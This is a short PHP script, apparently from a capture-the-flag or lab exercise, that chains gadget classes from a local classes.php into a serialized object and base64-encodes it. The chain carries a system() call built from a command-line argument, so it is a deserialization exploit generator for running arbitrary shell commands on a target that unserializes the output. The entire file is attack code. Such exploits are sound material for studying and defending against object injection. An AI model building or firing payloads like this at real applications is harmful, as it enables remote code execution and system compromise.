<?php
require("classes.php");
$vulnInstance = new GadgetThree\Vuln(1, "\xDE\xAD\xBE\xEF", false, "system('".$argv[1].";');");
$addersInstance = new GadgetOne\Adders($vulnInstance);
$echoersInstance = new GadgetTwo\Echoers();
$echoersInstance->klass = $addersInstance;
$serializedInstance = serialize($echoersInstance);
echo base64_encode($serializedInstance);


?>
